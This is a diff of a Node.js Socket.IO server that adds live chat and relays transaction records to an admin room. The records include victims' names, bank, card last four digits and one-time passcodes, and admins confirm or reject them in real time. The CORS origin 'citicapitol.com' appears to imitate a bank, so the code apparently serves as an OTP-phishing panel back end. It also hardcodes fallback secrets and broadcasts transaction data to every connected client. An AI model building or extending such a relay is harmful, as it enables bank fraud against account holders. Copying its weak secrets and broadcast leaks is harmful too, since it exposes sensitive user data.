@@ -1,4 +1,5 @@
-// socket-server.js
+
+  // socket-server.js
 console.log("🧠 Starting socket server...");
 
 import 'dotenv/config';
@@ -10,25 +11,25 @@ console.log("✅ Modules imported. Env vars:", process.env.PORT, process.env.SOC
 
 const app = express();
 const server = http.createServer(app);
+
 const io = new Server(server, {
-  cors: { origin: ["https://your-domain.com", "http://localhost:3000"] }
+  cors: {
+    origin: ["https://citicapitol.com", "http://localhost:3000"],
+    methods: ["GET", "POST"]
+  }
 });
 
 app.use(express.json());
 
-// 💾 Temporary store for confirmations
+// ================= TRANSACTION CONFIRMATIONS =================
 const pendingConfirmations = {};
-
-// Simple auth token for the HTTP emit endpoint (rotate / store in env)
 const SECRET = process.env.SOCKET_SECRET || "replace_with_a_strong_secret";
 
-// HTTP endpoint for backend to trigger admin notifications
 app.post("/emit", (req, res) => {
   const token = req.header("x-api-key") || "";
   if (!token || token !== SECRET) return res.status(401).json({ ok: false, message: "Unauthorized" });
 
   const payload = req.body || {};
-  // Validate allowed fields: transaction_id, user_id, amount, status, time, bank, last4
   const safe = {
     transaction_id: payload.transaction_id || null,
     fullname: payload.fullname || null,
@@ -47,46 +48,80 @@ app.post("/emit", (req, res) => {
     otp: payload.otp || null
   };
 
-  // Broadcast only to admins room
   io.to("admins").emit("notify_admin", safe);
   res.json({ ok: true });
 });
 
-io.on("connection", (socket) => {
-  console.log("socket connected:", socket.id);
+// ================= LIVE CHAT SYSTEM =================
+const chatRooms = {}; // { roomId: { user: {name,email}, messages: [] } }
+const ADMIN_SECRET = process.env.ADMIN_ROOM_SECRET || "supersecretadmin";
 
-  // Admins should call socket.emit('join_admin_room', { token }) after connecting
+io.on("connection", (socket) => {
+  console.log("Socket connected:", socket.id);
+
+  // ================= ADMIN HANDLERS =================
   socket.on("join_admin_room", ({ token }) => {
-    if (token === process.env.ADMIN_ROOM_SECRET) {
+    if (token === ADMIN_SECRET) {
       socket.join("admins");
       socket.emit("joined_admin");
-      console.log("Socket joined admins:", socket.id);
+      console.log("Admin joined:", socket.id);
+      socket.emit("active_chat_rooms", chatRooms); // send current active chats
     } else {
       socket.emit("error", "Invalid admin token");
     }
   });
 
-  // ✅ Listen for confirmation from admin
- socket.on("admin_confirm_txn", (data) => {
+  socket.on("admin_send", ({ room, message }) => {
+    if (!room || !message) return;
+    chatRooms[room]?.messages.push({ sender: "Admin", message });
+    io.to(room).emit("admin_message", { message });
+    socket.to("admins").emit("admin_message_sent", { room, message });
+  });
+
+  // ================= USER HANDLERS =================
+  socket.on("join_chat", ({ name, email, room }) => {
+    if (!name || !email || !room) return;
+
+    socket.join(room);
+    chatRooms[room] = chatRooms[room] || { user: { name, email }, messages: [] };
+    console.log(`User joined chat room: ${room}`, name, email);
+
+    // Welcome message
+    socket.emit("admin_message", { message: `Hello ${name}, a support agent will join shortly.` });
+
+    // Notify admins of new user
+    io.to("admins").emit("new_user", { room, name, email });
+  });
+
+  socket.on("user_message", ({ room, name, message }) => {
+    if (!room || !message) return;
+
+    chatRooms[room]?.messages.push({ sender: name, message });
+    io.to("admins").emit("user_message", { room, sender: name, message });
+  });
+
+  // ================= TRANSACTION HANDLERS =================
+  socket.on("admin_confirm_txn", (data) => {
     console.log("✅ Admin confirmed transaction:", data);
     pendingConfirmations[data.transaction_id] = data;
     io.emit("txn_confirmed", data);
   });
-// ✅ Listen for rejection from admin
-socket.on("admin-reject-txn", (data) => {
-  console.log("❌ Admin rejected transaction:", data);
-  pendingConfirmations[data.transaction_id] = { ...data, status: "rejected" };
-  // Notify all connected clients (or just admins if you prefer)
-  io.emit("txn_rejected", data);
-});
 
-   socket.on("user_join", ({ transaction_id }) => {
+  socket.on("admin-reject-txn", (data) => {
+    console.log("❌ Admin rejected transaction:", data);
+    pendingConfirmations[data.transaction_id] = { ...data, status: "rejected" };
+    io.emit("txn_rejected", data);
+  });
+
+  socket.on("user_join", ({ transaction_id }) => {
     if (pendingConfirmations[transaction_id]) {
       socket.emit("txn_confirmed", pendingConfirmations[transaction_id]);
     }
   });
+
+  // ================= DISCONNECT =================
   socket.on("disconnect", () => {
-    console.log("socket disconnected:", socket.id);
+    console.log("Socket disconnected:", socket.id);
   });
 });
 
